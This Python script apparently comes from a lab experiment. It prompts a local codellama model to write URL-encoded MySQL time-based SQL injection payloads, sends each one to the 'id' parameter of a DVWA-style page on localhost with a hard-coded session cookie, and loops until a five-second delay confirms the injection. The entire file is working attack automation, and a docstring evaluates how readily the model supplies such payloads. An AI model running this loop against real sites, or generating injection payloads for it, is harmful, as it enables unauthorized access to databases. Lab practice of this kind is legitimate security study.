from ollama import chat
import requests
import time
import re


"""
This model has potential. As it seems to be quick enough in generating a new payload but the responses are not consistent. 
I have a feeling with tweaking the prompt a bit more may get more consistent results.  
When asked to only provide the payload, it will generate the payload and attach it to the url which makes the post processing hard.  
As sometimes it will and sometimes it won't.  But again this model I would spend some more time with as it could have potential as being 
a good candidate for this type of job.
"""


def generate_sql_injection_payload(url_endpoint):
    # Prepare the prompt asking for a SQL injection payload
    sleep_variant = "' AND SLEEP(5)"
    prompt = f"Can you provide me a different sql injection like this {sleep_variant} payload for mysql in the 'id' parameter in the following URL: {url_endpoint}? Only return the payload (not the full url), no other text or markdown please. Also can you url encode it."
    #print(prompt)
    # Model Setup/Config
    messages = [
        {
            'role': 'user',
            'content': prompt
        }
    ]

    response = chat(
        model="codellama",  
        messages=messages
    )

    llm_response = response['message']['content'] 
    #print(llm_response)
    match = re.search(r'```.*\n(.*?)\n```', llm_response)
    if match:
        payload = match.group(1)
        #print(f"payload: {payload}")
        return payload

def requester(url_endpoint):
    cookies = {
        'security':'low',
        'PHPSESSID':'581b25fa353038edda12bf865490647b'
    }
    try:
        r = requests.get(url_endpoint, cookies=cookies)
        return r
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")
        return False    

def main():
    url_endpoint = "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"
    try:
        while True:
            sql_payload = generate_sql_injection_payload(url_endpoint)
            print(f"payload: {sql_payload}")
            start_time = time.time()
            url_endpoint = f"http://localhost/vulnerabilities/sqli/?id=1{sql_payload}&Submit=Submit#"
            r = requester(url_endpoint)
            end_time = time.time()
            elapsed_time = end_time - start_time
            formatted_time = f"{elapsed_time:.2f}"
            print(f"{formatted_time} {url_endpoint}")
            if elapsed_time >= 5:
                break
        print(f"[+] SQL Injection Found! {url_endpoint}") 
            

    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")

if __name__ == "__main__":
    begin_runtime = time.time()
    main()
    end_runtime = time.time()
    runtime = end_runtime - begin_runtime
    print(f"Runtime: {runtime:.2f}") # two decimal places
